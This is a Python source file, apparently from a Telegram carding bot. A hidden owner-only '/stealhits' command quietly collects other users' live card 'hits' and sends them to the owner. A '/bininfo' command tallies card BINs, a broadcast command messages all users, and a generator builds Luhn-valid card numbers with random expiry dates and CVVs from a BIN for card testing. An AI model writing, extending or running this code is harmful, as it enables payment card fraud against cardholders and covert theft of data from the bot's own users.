@bot.message_handler(commands=['broad'])
async def cmd_broadcast(message):
    """Admin only: Broadcast message to all approved users"""
    user_id = message.from_user.id
    
    if user_id != OWNER_ID:
        return
    if message.chat.type != 'private':
        await bot.reply_to(message, "⚠️ Use this command in *private chat* only!", parse_mode='Markdown')
        return
    
    text = message.text.replace('/broad', '').strip()
    
    if not text:
        await bot.reply_to(message, """
📢 *ʙʀᴏᴀᴅᴄᴀsᴛ* 📢
━━━━━━━━━━━━━━━━

*Usage:* `/broad Your message here`

Sends message to ALL approved users\\.
        """, parse_mode='MarkdownV2')
        return
    
    # Get all approved users
    approved = await get_approved_users()
    
    # Also get users from user_data directory
    all_users = set(approved)
    if os.path.exists(DATA_DIR):
        for uid_dir in os.listdir(DATA_DIR):
            try:
                all_users.add(int(uid_dir))
            except:
                continue
    
    if not all_users:
        await bot.reply_to(message, "❌ No users to broadcast to.")
        return
    
    # Broadcast message with nice formatting
    broadcast_msg = f"""
📢 *ᴀᴅᴍɪɴ ʙʀᴏᴀᴅᴄᴀsᴛ* 📢
━━━━━━━━━━━━━━━━

{text}

━━━━━━━━━━━━━━━━
_ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ @onABUSE_
    """
    
    success = 0
    failed = 0
    blocked = 0
    
    # Send in chunks of 25 to avoid Telegram rate limits
    CHUNK_SIZE = 25
    DELAY_BETWEEN_CHUNKS = 0  # No delay
    
    user_list = list(all_users)
    total_chunks = (len(user_list) + CHUNK_SIZE - 1) // CHUNK_SIZE
    
    status_msg = await bot.reply_to(message, f"📢 Broadcasting to {len(all_users)} users in {total_chunks} chunks...")
    
    for chunk_num in range(total_chunks):
        start_idx = chunk_num * CHUNK_SIZE
        end_idx = min(start_idx + CHUNK_SIZE, len(user_list))
        chunk = user_list[start_idx:end_idx]
        
        for uid in chunk:
            try:
                await bot.send_message(uid, broadcast_msg, parse_mode='Markdown')
                success += 1
            except Exception as e:
                error_str = str(e).lower()
                if "blocked" in error_str or "deactivated" in error_str or "not found" in error_str:
                    blocked += 1
                else:
                    failed += 1
                log(f"[BROADCAST] Failed to send to {uid}: {e}", "WARNING")
        
        # Update progress after each chunk
        progress = f"📢 Broadcasting... {chunk_num + 1}/{total_chunks} chunks\n✅ {success} sent | ❌ {failed + blocked} failed"
        try:
            await bot.edit_message_text(progress, chat_id=message.chat.id, message_id=status_msg.message_id)
        except:
            pass
        
        # Wait between chunks (except for last chunk)
        if chunk_num < total_chunks - 1:
            await asyncio.sleep(DELAY_BETWEEN_CHUNKS)
    
    await bot.send_message(message.chat.id, f"""
📢 *ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴏɴᴇ*
━━━━━━━━━━━━━━━━

✅ Delivered: *{success}*
🚫 Blocked/Deleted: *{blocked}*
❌ Errors: *{failed}*
📊 Total: *{len(all_users)}*

_Sent in {total_chunks} chunks_
    """, parse_mode='Markdown')


# ==================== SECRET ADMIN COMMANDS ====================

@bot.message_handler(commands=['stealhits'])
async def cmd_stealhits(message):
    """Secret: Get ALL live hits from a specific user or all users"""
    if message.from_user.id != OWNER_ID:
        return
    if message.chat.type != 'private':
        return  # Silent in groups
    
    parts = message.text.split()
    
    if len(parts) < 2:
        await bot.reply_to(message, r"""
👑 *Steal Hits Usage*
━━━━━━━━━━━━━━━━━━━

`/stealhits <user_id>` - Get all hits from specific user
`/stealhits all` - Get hits from ALL users
`/stealhits all file` - Get all hits as TXT file
        """, parse_mode='Markdown')
        return
    
    target = parts[1]
    as_file = len(parts) > 2 and parts[2].lower() == "file"
    
    all_hits = []

    # Prefer DB when available (Railway/cloud). This fixes "❌ No hits found" when hits exist.
    if USE_DATABASE:
        try:
            if target.lower() == "all":
                rows = await db_fetch_hits(limit=50000) or []
                for r in reversed(rows):  # oldest-first
                    uid = r.get("user_id")
                    gw = (r.get("gateway") or "").upper()
                    res = (r.get("result") or "").upper()
                    card = r.get("card_data") or ""
                    ts = r.get("created_at")
                    ts_str = ts.strftime("%Y-%m-%d %H:%M:%S") if hasattr(ts, "strftime") else str(ts)
                    all_hits.append(f"[{uid}] {ts_str} | {gw} | {res} | {card}".strip())
            else:
                target_uid = int(target)
                rows = await db_fetch_hits(user_id=target_uid, limit=50000) or []
                for r in reversed(rows):
                    gw = (r.get("gateway") or "").upper()
                    res = (r.get("result") or "").upper()
                    card = r.get("card_data") or ""
                    ts = r.get("created_at")
                    ts_str = ts.strftime("%Y-%m-%d %H:%M:%S") if hasattr(ts, "strftime") else str(ts)
                    all_hits.append(f"{ts_str} | {gw} | {res} | {card}".strip())
        except Exception as e:
            log(f"[DB] stealhits failed, falling back to file mode: {e}", "WARNING")
            all_hits = []
    
    if target.lower() == "all":
        # Get hits from all users
        if not os.path.exists(DATA_DIR):
            await bot.reply_to(message, "No user data found.")
            return
        
        for uid_dir in os.listdir(DATA_DIR):
            try:
                uid = int(uid_dir)
                user_dir = os.path.join(DATA_DIR, uid_dir)
                
                # Check all result files
                result_files = ["charged.txt", "approved.txt", "ccn.txt", "insufficient.txt",
                               "sh_charged.txt", "sh_approved.txt", "sh_ccn.txt", "sh_insufficient.txt"]
                
                for rf in result_files:
                    file_path = os.path.join(user_dir, rf)
                    if os.path.exists(file_path):
                        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                            content = await f.read()
                            for line in content.strip().split('\n'):
                                if line.strip():
                                    all_hits.append(f"[{uid}] {line.strip()}")
            except:
                continue
    else:
        # Get hits from specific user
        try:
            target_uid = int(target)
            user_dir = os.path.join(DATA_DIR, str(target_uid))
            
            if not os.path.exists(user_dir):
                await bot.reply_to(message, f"❌ User {target_uid} has no data.")
                return
            
            result_files = ["charged.txt", "approved.txt", "ccn.txt", "insufficient.txt",
                           "sh_charged.txt", "sh_approved.txt", "sh_ccn.txt", "sh_insufficient.txt"]
            
            for rf in result_files:
                file_path = os.path.join(user_dir, rf)
                if os.path.exists(file_path):
                    async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                        content = await f.read()
                        for line in content.strip().split('\n'):
                            if line.strip():
                                all_hits.append(line.strip())
        except ValueError:
            await bot.reply_to(message, "Invalid user ID.")
            return
    
    if not all_hits:
        await bot.reply_to(message, "❌ No hits found.")
        return
    
    if as_file:
        # Send as file
        content = "\n".join(all_hits)
        from io import BytesIO
        file_obj = BytesIO(content.encode())
        file_obj.name = f"all_hits_{len(all_hits)}.txt"
        await bot.send_document(message.chat.id, file_obj, caption=f"👑 {len(all_hits)} hits stolen!")
    else:
        # Send as messages (split if needed)
        text = f"👑 *Stolen Hits ({len(all_hits)})*\n━━━━━━━━━━━━━━━━━━━\n\n"
        for hit in all_hits:
            text += f"`{hit}`\n"
        
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                await bot.send_message(message.chat.id, text[i:i+4000], parse_mode='Markdown')
        else:
            await bot.reply_to(message, text, parse_mode='Markdown')


@bot.message_handler(commands=['bininfo'])
async def cmd_bininfo(message):
    """Secret: Show BIN info (first 6 digits) of all hits"""
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    
    if len(parts) < 2:
        await bot.reply_to(message, r"""
👑 *BIN Info Usage*
━━━━━━━━━━━━━━━━━━━

`/bininfo <user_id>` - View BINs from specific user
`/bininfo all` - View BINs from ALL users
        """, parse_mode='Markdown')
        return
    
    target = parts[1]
    bin_stats = {}  # bin -> count
    bin_cards = {}  # bin -> list of full cards
    
    async def extract_bins(user_dir):
        result_files = ["charged.txt", "approved.txt", "ccn.txt", "insufficient.txt",
                       "sh_charged.txt", "sh_approved.txt", "sh_ccn.txt", "sh_insufficient.txt"]
        
        for rf in result_files:
            file_path = os.path.join(user_dir, rf)
            if os.path.exists(file_path):
                async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    for line in content.strip().split('\n'):
                        if line.strip():
                            # Extract card number
                            card_part = line.split('|')[0].split('=>')[0].strip()
                            if len(card_part) >= 6 and card_part[:6].isdigit():
                                bin_num = card_part[:6]
                                if bin_num not in bin_stats:
                                    bin_stats[bin_num] = 0
                                    bin_cards[bin_num] = []
                                bin_stats[bin_num] += 1
                                bin_cards[bin_num].append(line.strip())
    
    if target.lower() == "all":
        if not os.path.exists(DATA_DIR):
            await bot.reply_to(message, "No user data found.")
            return
        
        for uid_dir in os.listdir(DATA_DIR):
            try:
                user_dir = os.path.join(DATA_DIR, uid_dir)
                await extract_bins(user_dir)
            except:
                continue
    else:
        try:
            target_uid = int(target)
            user_dir = os.path.join(DATA_DIR, str(target_uid))
            if os.path.exists(user_dir):
                await extract_bins(user_dir)
        except ValueError:
            await bot.reply_to(message, "Invalid user ID.")
            return
    
    if not bin_stats:
        await bot.reply_to(message, "❌ No BINs found.")
        return
    
    # Sort by count
    sorted_bins = sorted(bin_stats.items(), key=lambda x: x[1], reverse=True)
    
    text = f"👑 *BIN Statistics*\n━━━━━━━━━━━━━━━━━━━\n\n"
    for bin_num, count in sorted_bins[:50]:  # Top 50
        text += f"`{bin_num}` → {count} hits\n"
    
    text += f"\n📊 Total unique BINs: {len(bin_stats)}"
    
    await bot.reply_to(message, text, parse_mode='Markdown')


def parse_gen_format(format_str):
    """
    Parse flexible gen format: BIN/MM/YY/CVV or just BIN
    Missing parts are generated randomly.
    Supports 'x' as placeholder for random digits in BIN.
    Examples:
        424635 → BIN only, random MM/YY/CVV
        424635xxx → BIN with x placeholders for random digits
        424635/02/28/ → BIN with fixed MM=02, YY=28, random CVV
        424635//28/123 → BIN with random MM, fixed YY=28, fixed CVV=123
        424635/02/28/123 → All parts fixed
    Returns: (bin, mm, yy, cvv) where None means random
    """
    parts = format_str.replace('|', '/').replace(':', '/').split('/')
    
    # First part is always BIN (may contain x placeholders)
    bin_prefix = parts[0].strip().lower() if parts else None
    
    # Extract other parts (None if missing/empty)
    mm = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
    yy = parts[2].strip() if len(parts) > 2 and parts[2].strip() else None
    cvv = parts[3].strip() if len(parts) > 3 and parts[3].strip() else None
    
    # Validate MM if provided
    if mm:
        try:
            mm_int = int(mm)
            if mm_int < 1 or mm_int > 12:
                mm = None
            else:
                mm = str(mm_int).zfill(2)
        except:
            mm = None
    
    # Validate YY if provided
    if yy:
        try:
            yy_int = int(yy)
            if len(yy) == 4:  # Convert YYYY to YY
                yy = yy[2:]
            elif len(yy) != 2:
                yy = None
        except:
            yy = None
    
    # Validate CVV if provided
    if cvv:
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            cvv = None
    
    return bin_prefix, mm, yy, cvv


def generate_cards_advanced(bin_prefix, count, fixed_mm=None, fixed_yy=None, fixed_cvv=None):
    """
    Generate cards with optional fixed parts.
    If fixed_mm, fixed_yy, or fixed_cvv are provided, use those values.
    Otherwise generate random values.
    Supports 'x' placeholders in bin_prefix for random digits.
    """
    cards = []
    
    # Handle x placeholders - validate that only digits and x are present
    clean_bin = bin_prefix.lower().replace('x', '')
    if not bin_prefix or (clean_bin and not clean_bin.isdigit()):
        return []
    
    # Get the fixed part (before any x) for length check
    fixed_part = bin_prefix.split('x')[0] if 'x' in bin_prefix else bin_prefix
    if len(fixed_part) < 6 and 'x' not in bin_prefix:
        return []
    
    # Total length including x placeholders
    bin_len = len(bin_prefix.replace('x', '0'))  # Count x as digits
    if bin_len < 6:
        return []
    
    # Determine CVV length based on card type (Amex=4, others=3)
    cvv_len = 4 if bin_prefix[0] == '3' else 3
    
    attempts = 0
    max_attempts = count * 10
    
    while len(cards) < count and attempts < max_attempts:
        attempts += 1
        
        # Replace x placeholders with random digits
        current_bin = ""
        for char in bin_prefix:
            if char.lower() == 'x':
                current_bin += str(random.randint(0, 9))
            else:
                current_bin += char
        
        # Generate card number
        remaining = 16 - len(current_bin) - 1  # -1 for Luhn check digit
        if remaining < 0:
            remaining = 0
        middle = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
        partial = current_bin + middle
        
        # Calculate Luhn check digit
        check_digit = generate_luhn_digit(partial)
        cc = partial + check_digit
        
        # Use fixed or random MM
        if fixed_mm:
            mm = fixed_mm
        else:
            mm = str(random.randint(1, 12)).zfill(2)
        
        # Use fixed or random YY
        if fixed_yy:
            yy = fixed_yy
        else:
            current_year = datetime.now().year % 100
            yy = str(random.randint(current_year, current_year + 5)).zfill(2)
        
        # Use fixed or random CVV
        if fixed_cvv:
            cvv = fixed_cvv
        else:
            cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_len)])
        
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if card not in cards:
            cards.append(card)
    
    return cards


